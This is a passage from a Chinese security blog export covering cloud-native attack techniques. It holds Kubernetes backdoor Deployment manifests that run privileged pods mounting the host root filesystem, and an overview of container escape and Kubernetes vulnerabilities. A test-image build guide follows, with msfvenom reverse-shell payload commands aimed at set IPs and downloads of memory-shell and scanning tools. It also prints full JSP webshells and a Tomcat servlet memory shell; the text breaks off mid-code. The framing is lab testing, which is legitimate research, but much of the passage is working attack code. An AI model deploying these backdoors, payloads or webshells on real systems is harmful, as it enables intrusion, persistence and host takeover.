class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/host</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>



<h3 id="4-2-部署到master节点上"><a href="#4-2-部署到master节点上" class="headerlink" title="4.2 部署到master节点上"></a>4.2 部署到master节点上</h3><ul>
<li>backdoor-deployment-master.yaml</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">        <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">nodeAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">            <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">matchExpressions:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">                <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/host</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>顺便记录一下滑动到非master节点</p>
<ul>
<li>backdoor-deployment-slave.yaml</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">        <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">nodeAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">            <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">matchExpressions:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">                <span class="attr">operator:</span> <span class="string">DoesNotExist</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/host</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

















]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
      </tags>
  </entry>
  <entry>
    <title>容器云攻防体系介绍</title>
    <url>/%E5%AE%B9%E5%99%A8%E4%BA%91%E6%94%BB%E9%98%B2%E4%BD%93%E7%B3%BB%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<blockquote>
<p>上德不德，是以有德；下德不失德，是以无德。</p>
</blockquote>
<p>容器云可以看成是云原生应用的基础设施，包括容器和容器编排平台，容器编排平台目前一般使用的都是Kubernetes。本文主要分析容器和Kubernetes的攻击面以及如何防御。</p>
<span id="more"></span>

<h2 id="1-容器"><a href="#1-容器" class="headerlink" title="1. 容器"></a>1. 容器</h2><p>容器的概念大家都比较了解，我做个简单的介绍。容器使用到两个关键技术Namespaces和Cgroups。Linux Namespaces用于隔离容器的资源，Cgroups则用于限制资源。两者结合就把应用限制在一个容器这个盒子里，互不影响。</p>
<h2 id="2-Kubernetes"><a href="#2-Kubernetes" class="headerlink" title="2. Kubernetes"></a>2. Kubernetes</h2><p>常见的Kubernetes集群结构图如下，Master节点是集群的控制节点，Node节点则是集群的工作节点。</p>
<p><img src="../images/pic/k8s.png"></p>
<p><img src="../images/pic/k8s18.jpg"> </p>
<p><strong>Master节点：</strong></p>
<p>master节点是负责管理其他节点的主节点</p>
<p><strong>Node：</strong></p>
<p>每个Node节点可以看做一个物理节点。</p>
<p><strong>pod:</strong></p>
<p>看第二张图片，每个node上运行着pod，pod相当于跑的一个容器，并且可以修改副本数量，让同一个pod配置文件管理多个容器副本。</p>
<p><strong>API Server:</strong></p>
<p>通过API Server接口可以对集群进行管理</p>
<p><strong>kubelet:</strong></p>
<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
<p><strong>etcd：</strong></p>
<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
<h2 id="3-容器云攻击面"><a href="#3-容器云攻击面" class="headerlink" title="3. 容器云攻击面"></a>3. 容器云攻击面</h2><p><img src="../images/pic/k8s0.jpg"> </p>
<h3 id="3-1-容器逃逸"><a href="#3-1-容器逃逸" class="headerlink" title="3.1 容器逃逸"></a>3.1 容器逃逸</h3><p>容器安全中一个重要的攻击点就是容器逃逸，容器逃逸就是从容器中进行权限提升获取宿主机的权限。</p>
<p>容器逃逸手法有很多，我们做个简单的介绍。</p>
<p><strong>危险目录挂载：</strong></p>
<p>如果我们将宿主机根目录、root目录、/root/.ssh等危险目录挂载进了容器，这是很危险的一件事。比如在启动容器的时候将根目录挂载进容器，那么在容器里面可以使用chroot将宿主机目录当做容器的根目录，然后反弹一个shell获取宿主机的shell，或者写入ssh公钥或者写入定时任务等都可以获取到宿主机的shell。从而逃逸容器。</p>
<p>除了上面说的挂载危险目录，还有两个特殊的目录，Docker Socket和procfs。如果宿主机将Docker Socket的目录/var/run/docker.sock 挂载进行容器，也就是说此容器可以管理其他容器，那么我们就是可以在容器里面创建一个挂载危险目录的容器从而实现逃逸；procfs是一个伪文件系统，存储的是当前内核运行状态的一系列特殊文件，从2.6.19内核版本开始，加入了一个新特性，在/proc/sys/kernel/core_pattern中，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做脚本进行解析，那么我们就可以在管道符后写入后门程序达到命令执行的效果，如果把宿主机的/proc目录挂载进来，那么我们就可以把这个后门写入到宿主机上，从而实现逃逸。</p>
<p><strong>容器相关组件漏洞：</strong></p>
<p>CVE-2019-5736 runC容器逃逸漏洞：</p>
<p>runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。</p>
<p>CVE-2018-15664:符号链接替换漏洞：</p>
<p>CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行复制之前，将执行容器内的路径替换成一个符号链接，那么复制的时候，宿主机的docker就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。</p>
<p>CVE-2019-14271:加载不受信任的动态链接：</p>
<p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
<p><strong>Capabilites安全问题:</strong></p>
<p>Linux内核中的Capabilities特性用于划分特权集，相当于是对权限做了更细致的划分，比如可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。容器也支持Capabilities，我们可以指定各种特权来限制容器的权限。如果给的权限过大那么就可能导致容器逃逸。</p>
<ul>
<li>–privileged或者–cap-add=ALL可以获得所有特权集，如果容器通过privileged启动那么可以很轻松的逃逸容器。</li>
<li>SYS_ADMIN特权也可以逃逸，但是有比较大的限制，需要启动容器的时候开启额外的配置</li>
<li>SYS_PTRACE特权结合进程注入也可以逃逸容器，根上面一样启动容器的时候开启额外的配置</li>
<li>SYS_MODULE特权可以通过加载内核模块进行逃逸，这种利用起来比较方便</li>
</ul>
<p><strong>linux内核漏洞：</strong></p>
<p>利用Linux内核漏洞也是可以逃逸的，比如著名的脏牛。</p>
<h3 id="3-2-Docker-Remote-API-未授权"><a href="#3-2-Docker-Remote-API-未授权" class="headerlink" title="3.2 Docker Remote API 未授权"></a>3.2 Docker Remote API 未授权</h3><p>如果开起了Docker Remote API，可远程调用API来操作docker。如果我们通过Docker Remote API创建一个特权容器，相当于我们完全控制了主机。</p>
<h3 id="3-3-镜像安全"><a href="#3-3-镜像安全" class="headerlink" title="3.3 镜像安全"></a>3.3 镜像安全</h3><p>镜像安全存在两种风险，一是使用的镜像存在漏洞，比如使用了有漏洞的应用组件；二是镜像投毒，使用了恶意的镜像。</p>
<h3 id="3-4-Kubernetes相关组件未授权访问"><a href="#3-4-Kubernetes相关组件未授权访问" class="headerlink" title="3.4 Kubernetes相关组件未授权访问"></a>3.4 Kubernetes相关组件未授权访问</h3><p>在老版本或者通过配置让Kubernetes的端口直接对外暴露会产生高危安全问题，比如Kubernetes API Server未授权，Dashboard未授权访问，kubelet未授权访问等。</p>
<h3 id="3-5-通过Kubernetes部署后门pod实现持久化"><a href="#3-5-通过Kubernetes部署后门pod实现持久化" class="headerlink" title="3.5 通过Kubernetes部署后门pod实现持久化"></a>3.5 通过Kubernetes部署后门pod实现持久化</h3><p>比如可以部署一个特权容器的pod；如果部署的是一个Daemonset后门pod，这个Pod会自动在每一个节点上都部署一个后门pod。还可以部署一个CronJobs的pod后门，实现定时执行恶意命令。</p>
<h3 id="3-5-Kubernetes相关漏洞"><a href="#3-5-Kubernetes相关漏洞" class="headerlink" title="3.5 Kubernetes相关漏洞"></a>3.5 Kubernetes相关漏洞</h3><p>CVE-2018-1002105: Kuberntes权限提升：</p>
<p>此漏洞让能够访问集群的用户获取admin的权限，原理是http请求在升级为websockt的时候，中间代理错误处理不全，导致引起部分错误的请求会直接通过API Serever建立websockt连接，从而控制集群。</p>
<p>CVE-2019-11253:YAML炸弹：</p>
<p>通过恶意的yaml，让API Server消耗大量CPU资源，导致拒绝服务攻击。</p>
<p>CVE-2019-9512/9514: HTTP/2 协议实现存在问题：</p>
<p>HTTP/2的go实现库存在漏洞，导致处理恶意的HTTP/2流量的时候消耗大量资源，从而拒绝服务</p>
<h3 id="3-6-Kubernetes网络中间人攻击"><a href="#3-6-Kubernetes网络中间人攻击" class="headerlink" title="3.6 Kubernetes网络中间人攻击"></a>3.6 Kubernetes网络中间人攻击</h3><p>Kubernetes集群中也是可以进行中间人攻击的，通过修改dns解析的地址，劫持流量。解决方案是更细粒度的权限控制，禁用pod的CAP_NET_RAW权限，这样就无法发送ARP和DNS报文。</p>
<h2 id="4-容器云运行时安全"><a href="#4-容器云运行时安全" class="headerlink" title="4. 容器云运行时安全"></a>4. 容器云运行时安全</h2><p>容器云运行时安全我们使用的方案是用falco进行内核监控，使用它自带的规则和我们自定义的规则来做监控。它的底层是使用的eBPF技术。</p>
<h3 id="4-1-eBPF"><a href="#4-1-eBPF" class="headerlink" title="4.1 eBPF"></a>4.1 eBPF</h3><p>eBPF是一种包过滤技术，最开始是用来处理网络包的，像tcpdum就是基于eBPF开发的。它的特点就是可以将用户空间的代码直接放到内核去跑，而不用重新编译内核。比如我们用python或者C写的eBPF程序，编译后交给eBPF，就会将代码挂到程序指定的内核位置运行。</p>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>容器云</tag>
      </tags>
  </entry>
  <entry>
    <title>容器场景安全测试镜像制作及部署</title>
    <url>/%E5%AE%B9%E5%99%A8%E5%9C%BA%E6%99%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C%E5%8F%8A%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>针对容器云场景的测试，需要准备测试镜像。</p>
<span id="more"></span>



<h2 id="镜像准备"><a href="#镜像准备" class="headerlink" title="镜像准备"></a>镜像准备</h2><p>下载构建环境（我已经打包到github）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/root/</span>docker/</span><br><span class="line">cd <span class="regexp">/root/</span>docker/</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ShadowFl0w/</span>Cloud-Native-Security-Test.git</span><br></pre></td></tr></table></figure>

<p>准备其他工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/docker/Cloud-Native-Security-Test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载Tomcat</span></span><br><span class="line">wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.31/bin/apache-tomcat-8.5.31.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载jdk-8u251-linux-x64.tar.gz(已下载好)</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">msf木马</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f elf &gt; msfshell.elf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">java agent内存马</span></span><br><span class="line">wget https://github.com/keven1z/weblogic_memshell/releases/download/1.2/inject.jar</span><br><span class="line">wget https://github.com/keven1z/weblogic_memshell/releases/download/1.2/shell-agent.jar</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">添加java-sec-code项目</span></span><br><span class="line">git clone https://github.com/JoyChou93/java-sec-code</span><br><span class="line">在application.properties文件中添加`server.port = 8090`配置，因为默认端口是8080会和容器本身的tomcat端口冲突，所有这里需要改一下。</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line">jar复制到/root/docker/Cloud-Native-Security-Test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">id_rsa.pub</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">cp ~/.ssh/id_rsa.pub ./</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装CDK</span></span><br><span class="line">wget https://github.com/cdk-team/CDK/releases/download/v1.0.6/cdk_linux_amd64</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装fscan</span></span><br><span class="line">wget https://github.com/shadow1ng/fscan/releases/download/1.6.3/fscan_amd64</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改x.py ip和端口</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">编译a.c</span></span><br><span class="line">gcc a.c -o a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改5736ip和端口，并且编译</span></span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build 5736.go</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_ptrace,修改infec.c</span></span><br><span class="line">生成shellcode(如果不生成，会在靶机上生成一个终端)，这里我们需要提前知道反弹shell测试机器的地址和端口</span><br><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.138.0.5 LPORT=33033 -f c</span><br><span class="line">编译</span><br><span class="line">gcc infect.c -o infect</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">SYS_MODULE，修改exp.c</span></span><br><span class="line">make编译</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>可疑脚本docker-entrypoint.sh，给docker-entrypoint.sh添加执行权限</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">chmod +<span class="keyword">x</span> docker-entrypoint.sh</span><br></pre></td></tr></table></figure>

<p>使用Dockerfile构建镜像</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> build -t mytomcat:v<span class="number">6</span>.<span class="number">0</span>.<span class="number">1</span> .</span><br></pre></td></tr></table></figure>

<p>运行测试</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> run --rm -it --name mytomcat -p <span class="number">8081</span>:<span class="number">8080</span> mytomcat:v<span class="number">6</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>







<h2 id="马测试"><a href="#马测试" class="headerlink" title="马测试"></a>马测试</h2><h3 id="添加jsp马"><a href="#添加jsp马" class="headerlink" title="添加jsp马"></a>添加jsp马</h3><p>最基础的jsp马如下，放到<code>/usr/local/tomcat/webapps/ROOT</code>目录下</p>
<ul>
<li><p>jspshell0.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p> <code>http://172.16.42.10:8081/jspshell0.jsp?pwd=password&amp;cmd=whoami</code></p>
</li>
</ul>
<p>反射jsp马如下，放到<code>/usr/local/tomcat/webapps/ROOT</code>目录下</p>
<ul>
<li>ClassforName.jsp</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 加入一个密码</span></span><br><span class="line">    String PASSWORD = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    String passwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!passwd.equals(PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 反射调用</span></span><br><span class="line">    Class rt = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method gr = rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method ex = rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    Process process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问<code>http://172.16.42.10:8081/ClassforName.jsp?pwd=password&amp;cmd=whoami</code>即可 </p>
<h3 id="tomcat-内存马"><a href="#tomcat-内存马" class="headerlink" title="tomcat 内存马"></a>tomcat 内存马</h3><p>放到<code>/usr/local/tomcat/webapps/ROOT</code></p>
<ul>
<li>servletmem.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Servlet servlet = <span class="keyword">new</span> Servlet() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            PrintWriter out = servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    